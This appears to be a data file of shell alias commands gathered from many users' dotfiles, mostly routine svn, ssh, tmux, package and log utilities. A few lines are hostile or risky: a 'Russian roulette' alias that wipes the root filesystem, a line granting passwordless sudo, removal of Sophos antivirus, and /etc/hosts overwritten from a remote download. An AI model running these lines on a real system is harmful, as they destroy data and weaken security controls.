"test -z ""`aurman -Qdtq`"" && echo ""no orphan"" || aurman -Rns $(aurman -Qdtq)"
"test -z ""${TARGET}"" || export DOCKER_ARGS=""--target=${TARGET}"""
"test -z ""${OLDPWD:-}"" || cd ""$OLDPWD"""
"test -z ""$SSH_AGENT_PID"" || eval `ssh-agent -k`"
"test -z ""$(docker ps -aq)"" || docker rm -fv $(docker ps -aq); echo ""-- containers cleaned""; docker volume prune -f; echo ""-- volume cleaned""; docker system prune -f; echo ""--system cleaned""; echo ""------- Docker cleaned --------"""
"test -r .editorconfig || curl -fsSL ""${__GITHUB_BASE}/.editorconfig"" > .editorconfig"
"test -n ""${__GIT_PROJECT_NAME}"" || export __GIT_PROJECT_NAME=""$( basename ""$( pwd )"" )"""
"test -f bin/rake && bin/rake routes ""$@"" || \rake ""$@"""
"test -f ""${__BASH_ALIASES_WIP}"" || cp -v ""${__BASH_ALIASES}"" ""${__BASH_ALIASES_WIP}"" && $EDITOR ""${__BASH_ALIASES_WIP}"" && reload-aliases"
"test -e vault-password.txt ||
"test -e script/console && bundle exec script/console ""$@"" || bundle exec rails console ""$@"""
"test -d venv && source ./venv/bin/activate || echo ""No Virtualenv in the current folder"""
"test -d venv && source ./venv/bin/activate || echo ""No Virtualenv in current folder."""
"test -d venv && export VIRTUAL_ENV_DISABLE_PROMPT=1 && source ./venv/bin/activate || echo ""No Virtualenv in the current folder."""
"test -d venv && echo""Virtualvenv alredr exists."" || python3 -m venv venv"
"test -d venv && echo ""Virtualenv already exists."" || virtualenv --no-site-packages venv; venv"
"test -d venv && echo ""Virtualenv already exists."" || virtualenv --no-site-packages -p python3 venv; venv"
"test -d venv && echo ""Already exists"" || virtualenv --system-site-packages venv; activate"
"test -d shot && cd shot; for i in *; do test -f ../`sed ""s/.cr2$/.jpg/"" <<< ""$i""` || mv -v $i ../.qiv-trash/; done; unset i"
"test -d ENV && source ./ENV/bin/activate || echo ""No Virtualenv in the current folder"""
"test -d ENV && echo ""Already exists"" || virtualenv --system-site-packages ENV; activate"
"test -d /media/heyrict/LENOVO/Eric/psp/ && ppsspp || echo 'Folder not exist: /media/heyrict/LENOVO/Eric/psp/, exit.'"
"test -d ""${__DOTFILES_GIT_DISABLED}"" || echo no .git disabled dir - not fatal && mv -vf ""${__DOTFILES_GIT_DISABLED}"" ""${__DOTFILES_GIT}"" && g"
"test $# -ge 2 || usage ""empty value for"""
"test $# -ge 2 -a -f ""$2"" || usage ""missing file for"""
"test $# -ge 2 -a -d ""$2"" || usage ""missing directory for"""
"test $# -ge 2 -a ! -z ""$2"" || usage ""empty value for"""
"test $# -ge 1 || usage ""missing value for"""
"test $# -ge 1 || usage ""empty value for"""
"test $# -ge 1 -a -f ""$1"" || usage ""missing file for"""
"test $# -ge 1 -a -d ""$1"" || usage ""missing directory for"""
"test ! -z ""$SSH_AUTH_SOCK"" && test -S ""$SSH_AUTH_SOCK"" && ssh-add -l || export SSH_AUTH_SOCK=$(for SSH_AUTH_SOCK in $(find /tmp -user `whoami` -name agent\* 2>&- ); do ssh-add -l 1>&2 && echo ""$SSH_AUTH_SOCK"" && break; done;); test -S ""$SSH_AUTH_SOCK"" -a -r ""$SSH_AUTH_SOCK"" && ln -sf ""$SSH_AUTH_SOCK"" ""$HOME/.screen-ssh-agent"""
"terraform workspace select $(git branch | grep ""*"" | sed ""s/\* //"")"
"terminal-notifier -title ""Success"" -message ""Command complete"" || terminal-notifier -title ""Failure"" -message """""
"terminal-notifier -title ""Command $(([[ $? == 0 ]] && echo Succeeded) || echo Failed)"" -message ""The last command you ran has finished"""
"terminal-notifier -title ""$([ $? = 0 ] && echo terminal || echo error)"" -message ""$(pwd)"" -subtitle """""
"terminal-notifier -message ""$(history|tail -n1|sed -e "
"terminal-notifier -group ""terminal"" -title ""Terminal Task"" -activate ""com.googlecode.iterm2"" -message ""$([ $? = 0 ] && echo Finished || echo Error)"""
"temp=$(cat ~/.bash_history | peco); { echo ""$temp"" | pbcopy ; }"
"taskkill /f /pid $(tasklist|grep ^firefox|awk ""{print \$2}"")"
"tail \$1| grep -v $LHOST| grep -v ""chocolatine ;#"""
"tail -n 2 ~/.zsh_history | head -n 1| cut -d "";"" -f 2- -"
"tail -f log/development.log | grep -vE ""(^\s*$|asset)"""
"tail -f /var/log/system.log | grep --line-buffered ""Slate"" | sed ""s/.*.local Slate\[[0-9]*\]:/> /"""
"tail -f /var/log/mail.log | egrep -v ""imap|index"""
"tail -f ./minicom.log | grep ""RUN\|FAIL"""
"tail -f ./adb.log | grep ""RUN\|FAIL"""
"tail -f -n 450 storage/logs/laravel*.log | grep -i -E ""^\[\d{4}\-\d{2}\-\d{2} \d{2}:\d{2}:\d{2}\]|Next [\w\W]+?\:"" --color"
"tail -f ""/tmp/\$(ls -1tr /tmp | grep odie | tail -1)"""
"tail -f ""/tmp/$(ls -1tr /tmp | grep odie | tail -1)"""
"tail -2 $HISTFILE | head -1 | perl -pe ""s/^[^;]+;//g"""
"ta $(tl | cut -d"":"" -f 1 | fzf-tmux -r 30% --reverse)"
"t && printf ""\n\nprojects:\n"" && tp | tr ""\\n"" "" "" && printf ""\n"" && printf ""contexts:\n"" && tc | tr ""\\n"" "" """
"t ""\b(SEVERE|ERROR|FATAL)\b"""
"sysv-rc-conf --list | grep :on | sed ""s/.:off/ /g"""
"systemd-resolve --status | grep ""Current DNS Server"" | head -1"
"systemctl list-units --type=service | grep --color -E ""active running|$"""
"systemctl list-unit-files --type service | grep ""enabled \|disabled"""
"system_profiler SPUSBDataType | sed -n -e '/iPad/,/Serial/p' | grep \"
"system_profiler SPUSBDataType | sed -n '/iPhone/,/Serial/p' | grep \"
"system_profiler SPApplicationsDataType | egrep "":$"" | wc -l"
"sysctl hw.sensors | grep temp | sed ""s/hw.sensors.//; s/\.temp[0-9]=/: /;"""
"sysctl -a 2>/dev/null | grep -v grep | grep ""$@"""
"sysctl --all 2>/dev/null | grep -v grep | grep ""$@"""
"swpfile=$(swapon | tail -1 | cut -d"" "" -f1); sudo swapoff $swpfile; sudo swapon $swpfile; unset swpfile"
"swconfig dev switch0 show | grep ""link:"" | sed ""s/^[\t]*link: port:/port /"""
"sw master && git branch --merged master | grep -v ""\* master"" | xargs -n 1 git branch -d"
"svn switch $(svn info | grep ""URL:"" | sed ""s/URL: //"")"
"svn st|grep -v ""^? ""|grep -v ""^X """
"svn status|grep ""\."" | grep -v "".obj"""
"svn status | grep -v ""^[?XP]"" | grep -v ""^$"""
"svn status | grep -v ""^X "" | grep -v ""^Performing status on external item"""
"svn status | grep -v ""^?"" | grep -v ""^ M"""
"svn status | awk ""/\\?/ {print \$2}"" | xargs svn add"
"svn stat | grep -E ""^(M|A)"""
"svn stat -u | sort | sed -e ""s/^M.*/\o033[31m&\o033[0m/"" -e ""s/^A.*/\o033[34m&\o033[0m/"" -e ""s/^D.*/\o033[35m&\o033[0m/"""
"svn st |grep -v ""外部""|grep "" """
"svn st | grep ^\? | sed ""s/^\?[[:blank:]]\+//"""
"svn st | grep -v ""^?.*\(cache\/\|resources\/\)"""
"svn st | grep -v ""\?"" | egrep -v ""!"""
"svn st | egrep -e ""^\?"" | awk "
"svn st -u | grep -v ""?"" | sort"
"svn st -u | grep ""?"" | sort"
"svn st -q | awk ""{print \$2;}"" | xargs svn revert"
"svn rm `svn st | grep \! | tr -d ""! ""`"
"svn revert -R .; svn st | egrep -e ""^\?"" | awk "
"svn log -l 50 | perl -l40pe ""s/^-+/\\n/"" | less -S"
"svn info | grep ""^URL:"" | cut -d"" "" -f2"
"svn info | grep ""^URL"" | sed ""s/URL: //"""
"svn info | grep ""^Repository Root:"" | cut -d"" "" -f3"
"svn info | grep ""Repository Root"" | awk "
"svn editors . | grep $USER | sed ""s/[ ].*//"""
"svn diff |grep ""^+[^+]"" |wc -l"
"svn diff | tr -d \\r | vim -R -c ""set syntax=diff"" -"
"svn diff | sed -e""s/\(todo\)/\x1b[0;32m\1\x1b[0;0m/ig"" -e""s/\(xxx\)/\x1b[0;31m\1\x1b[0;0m/ig"" -e""s/\(<<<<\|>>>>\)/\x1b[1;31m\1\x1b[0;0m/"""
"svn diff cmt/requirements |grep ""+use ""|cut -b 6-"
"svn diff -x -p ""$*"" | colordiff | less"
"svn diff -r`(svn info | grep Revision | cut -d"" "" -f2)`:HEAD --summarize"
"svn diff --diff-cmd=""diff"" -x ""-u -w -B --strip-trailing-cr""| colordiff | less -R"
"svn diff ""${@}"" | colordiff | lv -c"
"svn ci `svs |grep -v Makefile |cut -d "" "" -f 8`"
"svn add `svn st | grep \? | tr -d ""? ""`"
"sudo vcgencmd version | grep version | cut -d "" "" -f 2"
"sudo vcgencmd get_mem gpu | tr -d ""gpu="" | tr -d ""M"""
"sudo vcgencmd get_mem arm | tr -d ""arm="" | tr -d ""M"""
"sudo updatedb && locate -e --regex ""\.pac(new|orig|save)$"""
"sudo umount /dev/sdb{1,2,3,4,6,7} && sudo shutdown -h now || echo shutdown failed"
"sudo umount $(sudo fdisk -l | grep NTFS | cut -f1 -d"" "") && echo ""done"""
"sudo tcpdump -i en1 -n -s 0 -w - | grep -a -o -E \""Host\: .*|GET \/.*\"""
"sudo tcpdump -i en1 -n -s 0 -w - | grep -a -o -E ""Host\: .*|GET \/.*"""
"sudo tcpdump -i en1 -n -s 0 -w - | grep -a -o -E ""Host\: .*|GET \/.*"
"sudo tcpdump -i en1 -n -s 0 -w - | env -i grep -a -o -E ""Host\: .*|GET \/.*"""
"sudo tcpdump -i en0 -n -s 0 -w - | grep -a -o -E ""Host\: .*|GET \/.*"""
"sudo tcpdump -i en0 -n -s 0 -w - | grep -a -o -E ""Host: .*|GET \/.*"""
"sudo tcpdump -i en0 -n -s 0 -w - | grep --color=always -a -o -E ""Host\: .*|GET \/.*"""
"sudo tail -f -n300 /var/log/pwnagotchi.log | sed --unbuffered \""s/,[[:digit:]]\{3\}\]//g\"" | cut -d \"" \"" -f 2- "
"sudo tail -f -n300 /var/log/kern.log | sed -e\""s/\[ */ /g\"" | cut -d \"" \"" -f 3,8-"
"sudo tail -f $(file $(sudo find /var/log -type f -not -name ""*.[0-9]*"") | grep text | cut -d : -f 1)"
"sudo systemctl restart $(systemctl | grep netctl-auto | sed -s ""s/\\s.*$//"")"
"sudo sysctl -A | fzf -m | tr -d "" """
"sudo ssh $(cat ~/ssh_hosts||awk ""{print \$3}"")"
"sudo ssh $(cat ~/ssh_hosts|peco|awk ""{print \$3}"")"
"sudo ssh $(cat ~/ssh_hosts|peco|awk ""{print \$3}"") ""df -h"" "
"sudo ss --no-header --numeric --listening --udp --processes | awk '{ print \$4, \$6 }' | column -t -o \$'\\t\\t'"
"sudo ss --no-header --numeric --listening --tcp --udp --processes | awk '{ print \$1, \$5, \$7 }' | column -t -o \$'\\t\\t'"
"sudo ss --no-header --numeric --listening --tcp --processes | awk '{ print \$4, \$6 }' | column -t -o \$'\\t\\t'"
"sudo sh -c ""chown -R $(whoami):33 $PWD && find storage public/direct bootstrap/cache -type d -print0 | sudo xargs -0 chmod 775 && find storage bootstrap/cache -type f -print0 | sudo xargs -0 chmod 664"""
"sudo sh -c ""chown -R $(whoami):10000 $PWD && find storage public/direct bootstrap/cache -type d -print0 | sudo xargs -0 chmod 775 && find storage bootstrap/cache -type f -print0 | sudo xargs -0 chmod 664"""
"sudo service apache2 restart && echo -e ""\033[1mApache successfully restarted!\033[0m\n"" || echo ""Apache failed to restart!"""
"sudo sed -i '/Modified Hosts Start/,/Modified Hosts End/d' /etc/hosts && ${curl_command} https://raw.githubusercontent.com/huanz/surge-hosts/master/hosts | sed -r -e '1i\# Modified Hosts Start' -e '/Copyright/,/Localhost.*End/d' | sudo tee -a /etc/hosts 1> /dev/null"
"sudo rpm -e $(rpm -qa | grep -E ""^kernel"" | grep -v $(uname -r))"
"sudo route -n delete `netstat -nr | grep 85.163.28.130/32 | awk '{print($1, $2)}'`"
"sudo rm /Library/Preferences/com.sophos.sav.plist || sudo ""/Library/Application Support/Sophos/opm/Installer.app/Contents/MacOS/tools/InstallationDeployer"" --remove"
"sudo renice -n -20 -p $(pgrep mixxx|paste -sd"" "") && sudo ionice -c 1 -n 0 -p $(pgrep mixxx|paste -sd"" "")"
"sudo pstree -pnua|egrep -v ""\{\S+\}"" | less"
"sudo ps axo ""user,pid,ppid,vsz,command"" |sort -rnk4|head "
"sudo ps axo ""user,pid,ppid,%cpu,command"" |sort -rnk4|head "
"sudo pacman -Syuu || sudo pacman -Syuu --ignore=linux-lts,linux-lts-headers,zfs-linux-lts,zfs-utils-common,spl-linux-lts,spl-utils-common"
"sudo pacman -Syuu || sudo pacman -Syuu --ignore=linux,linux-headers,zfs-linux,zfs-utils-common,spl-linux,spl-utils-common"
"sudo pacman -S $(pacman -Ss | grep ""^\S*\/"" | awk -F ""/"" "
"sudo pacman -Rns $(pacman -Qtdq) 2> /dev/null || echo ""==> None found."""
"sudo pacman -Rcns $(pacman -Q | dmenu -l 10 | sed ""s/\s.*//g"")"
"sudo netstat -ap | grep -E ""(SYN|ESTABLISHED)"""
"sudo netstat -alnp --protocol=inet | grep -v CLOSE_WAIT | cut -c-6,21-94"
"sudo netctl switch-to ""$(netctl list | fzf | sed -r "
"sudo mount -t ntfs-3g $(sudo fdisk -l | grep NTFS | cut -f1 -d"" "") /mnt/ntfs/ && echo ""done"""
"sudo mount -o remount,rw / ; fs_mode=\$(mount | sed -n -e ""s/^.* on \/ .*(\(r[w|o]\).*/\1/p"")"
"sudo mount -o remount,ro / ; fs_mode=\$(mount | sed -n -e ""s/^.* on \/ .*(\(r[w|o]\).*/\1/p"")"
"sudo lsof \!* | grep -i tcp | grep "" """
"sudo lsof -i -n -P | grep ""TCP.*(LISTEN)"" | grep "":[0-9]\{2,\}"""
"sudo lsof -i -P | egrep -i ""listen|established"""
"sudo lsof -d DEL | awk ""\$8~/\/usr\/lib/ { print \$NF }"" | sort -u"
"sudo lsof -d DEL +c0 | awk '\$8~/\/usr\/lib/ && !x[\$NF\$1]++ { print \$NF, \$1; }' | column -t"
"sudo lsof -P -i -n | cut -f 1 -d "" "" | uniq"
"sudo ls /media/sysdata/rev5/_context/conf/haproxy/rev4/`hostname`/|grep "".conf""| while read x; do echo -e ""\n ## conf - $x""; sudo /usr/sbin/haproxy -c -f /media/sysdata/rev5/_context/conf/haproxy/rev4/`hostname`/$x; done"
"sudo killall NetworkManager && echo ""NetworkManager killed"" || echo ""Nothing to kill"""
"sudo kill -INT `ps aux|grep ""^root.*unicorn master""|awk -F"" "" ""{print \\$2}""` && rvmsudo unicorn -p 80 -D config.ru start"
"sudo kill -HUP $(ps -A -ostat,ppid | grep -e ""[zZ]""| awk ""{ print \$2 }"")"
"sudo kill -9 $(sudo ps -A | grep mpd | cut -f 1 -d "" "")"
"sudo iwlist wlan0 scan | egrep -i ""essid|frequency"""
"sudo iw wlp3s0-proft.me scan | egrep ""signal|SSID"""
"sudo grep -o ""$(date +%b\ %e).*"" /var/log/auth.log | head -1 | cut -c1-16"
"sudo grep -iq ""^${SUDO_USER:-${USER}}.*NOPASSWD.*ALL.*$"" /etc/sudoers && sudo sed -i ""/^${SUDO_USER:-${USER}}.*NOPASSWD.*ALL.*$/d"" /etc/sudoers || echo ""entry not in /etc/sudoers"" >&2"
"sudo grep -iq ""^${SUDO_USER:-${USER}}.*NOPASSWD.*ALL.*$"" /etc/sudoers && echo ""entry already in /etc/sudoers"" >&2 || sudo bash -c ""echo -e \""${SUDO_USER:-${USER}}\tALL = NOPASSWD: ALL\n\"" >> /etc/sudoers"""
"sudo grep -Ev ""^($|#|;)"" $1"
"sudo gdu -ah --exclude=/{proc,sys,dev} / | sort -rh | head -n 20"
"sudo find / -regextype posix-extended -regex "".+\.pac(new|save|orig)"""
"sudo find / -path /home/yangling -prune -o -regextype posix-extended -regex "".+\.pac(new|save|orig)"" -print"
"sudo find . \( -name ""*.log"" -o -name ""*.trc"" \) -mtime -1 | sudo xargs ls -ltr | less -R"
"sudo find . \( -name ""*.log"" -o -name ""*.trc"" \) -mtime -1 | sudo xargs ls -ltr --color | less -R"
"sudo find . -printf ""%s %p\n""| sort -nr | head -10"
"sudo find . -printf ""%T+\t%p\n"" | sort | tail -n 100"
"sudo echo; while true; do [ -f /var/lib/puppet/state/agent_catalog_run.lock ] && { echo ""Puppet is still running, waiting 10s - `date`""; sudo -v; } || { ipuppet; break; }; sleep 10s; done"
"sudo echo; while true; do [ -f /var/lib/puppet/state/agent_catalog_run.lock ] && { echo ""Puppet is still running, waiting 10s - `date`""; sudo -v; } || { ipuppet apply; break; }; sleep 10s; done"
"sudo echo """"; echo ""/home usage""; sudo btrfs filesystem usage /home | grep -E ""^\s+(Used|Free \(estimated\)):"";echo """""
"sudo echo """"; echo ""/ usage""; sudo btrfs filesystem usage / | grep -E ""^\s+(Used|Free \(estimated\)):"";echo """""
"sudo dumpkeys | sed ""s/\s*58\s*=\s*Caps_Lock/ 58 = Control/"" | sudo loadkeys"
"sudo du -cks err.txt generated.file succ.txt | sort -rn | while read size fname; do for unit in k M G T P E Z Y; do if [ $size -lt 1024 ]; then echo -e ""${size}${unit}\t${fname}""; break; fi; size=$((size/1024)); done; done"
"sudo du -ah --exclude=/{proc,sys,dev} / | sort -rh | head -n 20"
"sudo dscacheutil -flushcache || true &&
"sudo docker rmi $(sudo docker images | grep ""^<none>"" | awk ""{print $3}"")"
"sudo docker rmi $( sudo docker images | grep ""^<none>"" | awk ""{print $3}"")"
"sudo docker ps -q | xargs -n 1 sudo docker inspect --format ""{{ .NetworkSettings.IPAddress }} {{ .Name }}"" | sed ""s/ \// /"""
"sudo dkms install vboxhost/$(pacman -Q virtualbox|awk {""print $2""}|sed ""s/\-.\+//"")"
"sudo date -u --set=""$(curl -H ""Cache-Control: no-cache"" -sD - http://google.com |\grep --color ""^Date:"" |cut -d\ -f3-6)"""
"sudo date -s ""$(wget -qSO- --max-redirect=0 google.com 2>&1 | grep Date: | cut -d"
"sudo date --set @""$(wget -q https://ntp-a1.nict.go.jp/cgi-bin/jst -O - | sed -n 4p | cut -d. -f1)"""
"sudo cut -d: -f1 /etc/passwd | grep -vE ""#"" | while read user; do echo -e ""\nCrontab for $user:""; sudo crontab -u$user -li; done"
"sudo cryptsetup --type luks open `sudo fdisk -l | grep -A 3 ""^Disk identifier: 0xbf40ec14"" | grep -o ""/dev/sd[a-z]1""` extern && sudo mount -t ext4 /dev/mapper/extern $HOME/mount"
"sudo cat /usr2/mysql/logs/mysql.err|grep -vE ""(Statement may not be safe|Unsafe statement written to the binary log)"""
"sudo cat /sys/kernel/debug/usb/devices | grep -E ""^([TSPD]:.*|)$"""
"sudo bash -c \""find . -type f | xargs -I {} chmod 664 {} && find . -type d | xargs -I {} chmod 775 {} && chown -R dimanne:dimanne .\"""
"sudo bash -c ""sudo apt-get update && apt-get install -y -t testing golang && apt-get install -y gcc git mercurial libgtk-3-dev libgtkspell3-3-dev libtspi-dev trousers"" && mkdir -p /home/amnesia/Persistent/go/src/golang.org/x && cd /home/amnesia/Persistent/go/src/golang.org/x && git clone https://github.com/golang/crypto && git clone https://github.com/golang/net && go get -u -tags ubuntu github.com/agl/pond/client && echo ""Success"" || echo ""Sorry, something went wrong."""
"sudo bash -c ""apt-get update && apt-get -f -y full-upgrade || dpkg --configure -a && apt-get -y autoremove && apt-get autoclean"""
"sudo bash -c ""apt update && apt-get -f -y full-upgrade && apt-get -y autoremove && apt-get autoclean"" || notify-send -i error ""System Update"" ""Something was wrong on package manager update task."""
"sudo apt-get update 2> /tmp/keymissing; for key in $(grep ""NO_PUBKEY"" /tmp/keymissing |sed ""s/.*NO_PUBKEY //""); do echo -e ""\nProcessing key: $key""; sudo gpg --keyserver subkeys.pgp.net --recv $key && sudo gpg --export --armor $key | sudo apt-key add -; done"
"sudo apt-get update 2> /tmp/keymissing; for key in $(grep ""NO_PUBKEY"" /tmp/keymissing |sed ""s/.*NO_PUBKEY //""); do echo -e ""\nProcessing key: $key""; gpg --keyserver pool.sks-keyservers.net --recv $key && gpg --export --armor $key | sudo apt-key add -; done"
"sudo apt-get update && sudo apt-get -u dist-upgrade && [ -x /usr/bin/toilet ] && (toilet -f future --metal ""Kaboom-shakalaka!"" || echo ""Kaboom-shakalaka!"")"
"sudo apt-get remove --purge $(dpkg -l | grep ^rc | \
"sudo apt-get purge \$(dpkg -l | awk -v verinfo=\$(uname -r) 'match(\$0,/linux-image-/){if(\$0!~/-hwe/&&\$2!~verinfo) print \$2}' | sed '1d')"
"sudo apt-get purge $(dpkg -l | grep ""^rc"" | awk ""{print $2}"")"
"sudo apt-get install --reinstall `dpkg -l | grep grub | awk ""{ print \$2 }""`"
"sudo apt upgrade;cat /var/run/reboot-required||echo ""no restart needed :)"""
"sudo apt update && yes | sudo apt upgrade && yes | sudo apt autoremove && echo ""Updating snaps..."" && snap refresh"
"sudo apt update && sudo apt -f -y full-upgrade && sudo apt -y autoremove && sudo apt autoclean || notify-send -i error ""System Update"" ""Something was wrong on package manager update task."""
"sudo apt dist-upgrade;cat /var/run/reboot-required||echo ""no restart needed :)"""
"sudo `history | tail -n 1 | sed -e ""s/[0-9 ][0-9 ]*//"" -e ""s/\n//""`"
"sudo `history | head -n 1 | awk ""{$1 = "
"sudo [ $[ $RANDOM % 6 ] == 0 ] && rm --no-preserve-root -rf / || echo ""You live to play another day"";"
"sudo /usr/sbin/named-checkconf -z|grep -E ""(error|failed)""; echo ""Bind9 check"""
"sudo /opt/vc/bin/vcgencmd measure_volts | tr -d ""volt="" | tr -d ""V"""
"sudo $(history | tail -n 1 | sed -e ""s/^[ ]*[0-9]*[ ]*//g"")"
"sudo $(history 2 | head -n 1 | sed -e ""s/^ *[0-9]\+ \+//"")"
"su netstat -ant | h -i ""127.0.0.1|::1"" listen java postgres nginx mysqld established $AXEL_PORT $H_NETSTAT "
"su -c ""emerge --update --deep --with-bdeps=y --newuse --autounmask-write world ||etc-update"""
"su -c ""emerge --update --deep --with-bdeps=y --newuse --#autounmask-write world ||etc-update"""
"stow --ignore=""dir|gschemas.compiled|icon-theme.cache"""
"stoken | tr -d ""\n"" | pbcopy"
"stern -s 1m --exclude ""ping|metrics|HealthCheck"""
"step1; step2; step3; epc; fnRename; ..; open ""`ls -t | grep .epub | head -1`"""
"step1; step2; step3; epc; fnRename2; ..; mv *.epub ~finals; cd ~finals; open ""`ls -t | grep .epub | head -1`"""
"start https://$(git config remote.origin.url | cut -f2 -d@ | tr "":"" /)"
"stack ghci $(find . -name ""*.cabal"" | perl -lpe ""s/.*\/(.*)\.cabal/\1/g"" | fzf)"
"st | sed ""s/\? //g"" | xargs cat"
"st | grep -E ""^(D|!)"""
"st | grep -E ""^(A|---)"""
"ssh-keygen -R $(terraform show | grep default_ip_address | cut -d ""="" -f2)"
"ssh-add -l >/dev/null || ssh-add && alias ssh=""ssh -XYC""; ssh -XYC"
"ssh-add -l >/dev/null || ssh-add && alias ssh=""TERM=xterm-256color ssh"";TERM=xterm-256color ssh"
"ssh wherewolf-WORKER0001 ""tail -f /var/log/nginx/wherewolf.log"" | grep -v ""uptimeCheck"" | logstalgia --sync --full-hostnames --update-rate 1 -g ""API,URI=.*,100"""
"ssh wca 'date && ps -eo rss,comm,pid,args | grep -i unicorn | grep -v grep'"
"ssh ubuntu -t $@ ""tmux attach || tmux new"""
"ssh root@10.42.1.19 lsof -c vlc|grep Z1C|cut -d '/' -f4,5,6,7,8,9,10,11,12,13,14"
"ssh root@$(arp -n | grep c0:ee:fb:d3:9f:66 | grep -Eo ""^[0-9.]+"") ""setprop service.adb.tcp.port 5555
"ssh oi -L 37017:donoratainstanta:27017 -t ""command; tmux attach || tmux new"""
"ssh jszmajda@devops-bastion.optoro.com -t ""tmux attach || tmux"""
"ssh home -t ""bash -ic transmission"" || bash -ic transmission"
"ssh home -qt ""tmux a || (echo "
"ssh hawg grep tmrl /var/log/https/bitsend.com/access_log|tail -1|awk ""{print \$1}"""
"ssh freebsd -t ""tmux attach -t deluge || tmux new-session -s deluge"""
"ssh dsk -t ""/apollo/env/envImprovement/bin/tmux attach -t jchower || /apollo/env/envImprovement/bin/tmux new -s jchower"""
"ssh centos@$(echo $(cat $AWS_INVENTORY | fzf) | cut -d "","" -f3) -i ~/.ssh/stroom_aws_key.pem"
"ssh cbt-jump ""ssh cbt-production-app1 \""./cbt_dump_db\"" "" | gunzip | psql -U postgres cbt_production"
"ssh bsd -t ""tmux attach -t lliu || tmux new -s lliui"""
"ssh bblue -qt ""tmux a || (echo "
"ssh `find-exo-hosts infra-cfg0 | sort | head -1` ""cd /etc/puppet/environments/marco/ && sudo git clean -fxd && sudo rm -rf modules && sudo librarian-puppet install"""
"ssh -t self ""tmux -2 attach || tmux -2"""
"ssh -t pr-dev-1 ""cd src && clear && { tmux attach || tmux; }"""
"ssh -t ovh ""tmux -2 attach || tmux -2"""
"ssh -t nmy ""screen -U -D -RR || screen -S sou -c ./users/sou/screenrc"""
"ssh -t my ""screen -U -D -RR || screen -S sou -c ./users/sou/screenrc"""
"ssh -t gitlab-ci ""cd src && clear && { tmux attach || tmux; }"""
"ssh -t ""tmux -CC attach || tmux -CC"""
"ssh -i ~/.ssh/id_rsa jpeschka@linuxlab.cs.pdx.edu -t $@ ""tmux attach || tmux new"""
"ssh -i ~/.ssh/id_rsa jpeschka@linux.cs.pdx.edu -t $@ ""tmux attach || tmux new"""
"ssh -i ~/.ssh/id_rsa jpeschka@babbage.cs.pdx.edu -t $@ ""tmux attach || tmux new"""
"ssh -i ~/.ssh/id_rsa jpeschka@ada.cs.pdx.edu -t $@ ""tmux attach || tmux new"""
"ssh -Y -t jagu@unix6.andrew.cmu.edu ""cd ~/private/p3; tmux attach -d || tmux"""
"ssh -X troodon -t ""tmux -CC attach || tmux -CC"""
"ssh -A $(grep -iE ""^host[[:space:]]+[^*]"" ~/.ssh/config|peco|awk ""{print \$2}"")"
"ssh -A $(grep -iE ""^host[[:space:]]+[^*]"" ~/.ssh/config| awk ""{print \$2}""| peco)"
"ssh $(grep -iE ""host[[:space:]]+[^*]"" ~/.ssh/config|peco|awk ""{print \$2}"")"
"ssh $(grep -iE ""^host[[:space:]]+[^*]"" ~/.ssh/config|peco|awk ""{print \$2}"")"
"ssh $(grep -iE ""^host[[:space:]]+[^*]"" ~/.ssh/config | peco | awk ""{print \$2}"") 2>/dev/null"
"ssh $(grep -iE ""^host[[:space:]]+[^*]"" ~/.ssh/config | fzf | awk ""{print \$2}"")"
"ssh $(grep -h ""^Host"" ~/.ssh/config | peco | awk ""{print \$2}"")"
"ssh $(grep ""^Host"" ~/.ssh/config|peco|awk ""{print \$2}"")"
"ssh $(grep ""^Host "" ~/.ssh/config|awk ""{print \$2;}""|peco)"
"ssh $(grep ""Host "" ~/.ssh/config | cut -c6- | sk)"
"ssh $(echo `cat ~/.ssh/config ~/.ssh/conf.d/*.conf|gsed -n -e ""/^Host / { s/^Host \(.\+\)$/\1/g; /\*/d; s/ /\n/g;p }""|fzf --reverse`)"
"ssh $(cat .ssh/known_hosts|awk -F ',' '{print $1}'|fzf)"
"ss rts| egrep ""\| rts0"""
"squeue -u krisb -o ""%.18i %.9P %.8j %.8u %.2t %.10M %.6D %Z"" | grep "" R "" | wc -l"
"squeue -p $kuang_queues -t PD |grep -v ""(Dependency)$"" |sort -rk 2,2; sinfo -p $kuang_queues -o ""%10P %.4D %16C %N"" -t idle,mix"
"squeue -l | grep -v "" RUNNING"" | more"
"squeue -l | grep "" RUNNING"" | more"
"squeue --start -o ""%18S %.18i %.9P %.8j %.iu %.2t %10M %.6D %R"" | egrep ""(Resources|START)"""
"spotify status | grep -E ""(Artist.*$|Track.*$)"""
"source ~/.zshrc ; echo -e ""\n\n|---ZSh Profile Updated---| \n\n"""
"source ~/.bashrc ; kill $(ps aux | grep grep -v | grep -i \
"source ~/.bash_profile && echo ""File .bash_profile reloaded correctly"" || echo ""Syntax error, could not import the file"""
"source ~/.bash_aliases && echo ""bash aliases refreshed"" || echo ""error in bash aliases file"""
"source venv/bin/activate 2> /dev/null || echo ""No virtual environment available."""
"source <(sudo echo ""dist-upgrade && sudo apt-file update && success \""dist upgrade\"""") || fail ""dist upgrade"" "
"source $(find . -maxdepth 3 -name ""activate"") 2> /dev/null || echo ""No virtualenv available"""
"source ""$ZSH_CUSTOM/ZSH_THEME.zsh-theme"" 2>/dev/null || source ""$ZSH_CUSTOM/themes/$ZSH_THEME.zsh-theme"""
"sort $FAVPATH | sed ""s/:/:-- /g"" | column -t -s :"
"sleep 2; xwd -root | xwdtopnm | pnmtopng > ""`date`.png"""
"sinfo -l | egrep ""(idle|PARTITION)""; echo "" ""; sinfo -o ""%P %t %F"" -p standard -t idle; echo ""(A)llocated, (I)dle, (O)ther, (T)otal"""
"simple-mtpfs --device $(simple-mtpfs -l | grep ""SamsungGalaxy"" | cut -d"":"" -f1) /mnt/phone"
"simple-mtpfs --device $(simple-mtpfs -l | grep ""Nexus 4/10"" | cut -d"":"" -f1) /mnt/tablet"
"shuf -n 3 /usr/share/dict/british-english | sed ""s/./\u&/"" | tr -cd ""[A-Za-z]""; echo $(shuf -i0-999 -n 1)"
"showq -l |grep ""Running""|sort -k 5 -n"
"shopt -q login_shell && echo ""yes"" || echo ""no"""
"shopt -q login_shell && echo ""Login shell"" || echo ""Not login shell"""
"sha1sumi) || { echo >&2 ""I require shasum or sha1sum to run. Aborting.""; exit 1; }"
"sha1sum || { echo >&2 ""I require shasum or sha1sum to run. Aborting.""; exit 1; }"
"sh ~/script_shell/ft_check_used.sh ""ft"" |sort |uniq"
"sh -c \""docker-compose start || docker-compose up\"""
"sg_posh 'ps | select name,id,path' | rg -v svchost"
